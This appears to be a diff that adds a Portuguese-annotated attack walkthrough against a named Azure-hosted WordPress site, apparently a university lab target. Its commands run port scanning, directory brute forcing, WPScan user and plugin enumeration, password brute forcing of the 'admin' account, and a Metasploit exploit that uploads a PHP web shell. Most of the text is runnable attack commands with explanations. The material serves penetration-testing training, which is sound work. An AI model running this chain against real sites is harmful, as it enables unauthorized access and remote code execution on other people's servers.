@@ -1,0 +1,72 @@
+# Testar a resposta do alvo
+ping labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net
+
+# Scan de portas
+nmap -p- -sV -T4 labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net
+# É o scanner de rede mais usado para descobrir portas, serviços e versões.
+#-p- Diz ao Nmap: “escaneie todas as portas TCP de 1 até 65535”. Sem isso, o Nmap só escaneia as 1000 portas mais comuns. Aqui é um full scan, mas pode demorar mais.
+# -sV Ativa service/version detection: O Nmap tenta identificar o serviço que está rodando em cada porta aberta.
+# -T4 Define a agressividade/velocidade do scan. Vai de T0 (bem lento) até T5 (muito agressivo). T4 é um bom meio termo: rápido, mas sem ser tão ruidoso como T5.
+
+# Cabeçalhos HTTP
+curl -I -L labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net
+# curl É a ferramenta de linha de comando para fazer requisições HTTP, HTTPS, FTP etc. Aqui usamos para “falar” com o servidor web.
+# -I Head request
+# - L Significa follow redirects (seguir redirecionamentos).
+# Esse comando serve para: Confirmar se o site responde. Identificar status code (200, 301, 403, etc). Ver se há redirecionamento automático. Descobrir infos do servidor (Server, X-Powered-By, cookies).
+
+# Verificar caminhos ocultos
+curl -s labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net/robots.txt
+#-s → modo silencioso (não mostra barra de progresso).
+# /robots.txt → arquivo usado por buscadores, muitas vezes contém paths ocultos que o admin não queria que fossem indexados.
+# Objetivo: descobrir rotas “escondidas” (ex: /admin, /backup, etc).
+
+# Enumeração de diretórios
+gobuster dir -u https://labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net/ -w /usr/share/wordlists/dirb/common.txt -o gobuter.txt
+# gobuster dir → brute force de diretórios/arquivos escondidos no site.
+# -u → URL alvo.
+# -w → wordlist (lista de diretórios comuns).
+# -o → salva saída em arquivo (gobuter.txt).
+# Objetivo: descobrir páginas ocultas (ex: /login, /config, /phpmyadmin).
+
+# Enumeração com WPScan 
+echo "[*] WPScan: Enumerando usuários" 
+wpscan --url labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net --enumerate u > wpscan_users.txt 
+echo "[*] WPScan: Enumerando plugins vulneráveis" 
+wpscan --url labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net --enumerate vp > wpscan_plugins.txt
+# wpscan → scanner focado em sites WordPress.
+# --enumerate u → enumera usuários cadastrados.
+# --enumerate vp → enumera plugins vulneráveis.
+# > arquivo.txt → redireciona saída para arquivo.
+
+Objetivo: identificar usuários válidos + plugins vulneráveis conhecidos
+
+# Criar lista customizada
+
+# Brute Force
+wpscan \
+  --url https://labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net/ \
+  --usernames admin \
+  --passwords custom_wordlist.txt \
+  --max-threads 2 \
+  --throttle 1
+# --usernames admin → tenta login com usuário admin.
+# --passwords custom_wordlist.txt → lista de senhas a testar.
+# --max-threads 2 → define apenas 2 threads simultâneas (para não sobrecarregar).
+# --throttle 1 → espera 1 segundo entre cada requisição, reduzindo chance de bloqueio.
+# Objetivo: tentar descobrir senha do usuário admin.
+
+# Metasploit
+msfconsole
+search wordpress
+use exploit/unix/webapp/wp_admin_shell_upload"
+set RHOSTS labunifecaf-gjc6evbudff9fnh5.westus3-01.azurewebsites.net
+set USERNAME admin
+set PASSWORD senha
+run
+# msfconsole → abre o console do Metasploit.
+# search wordpress → procura exploits relacionados a WordPress.
+# use exploit/unix/webapp/wp_admin_shell_upload → exploit que faz upload de shell PHP via painel admin do WordPress.
+# set RHOSTS → define alvo.
+# set USERNAME / PASSWORD → credenciais para login.
+# run → executa exploit.
